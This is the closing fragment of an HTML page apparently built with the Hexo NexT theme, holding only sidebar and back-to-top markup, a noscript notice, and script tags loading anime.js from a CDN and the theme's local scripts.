  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
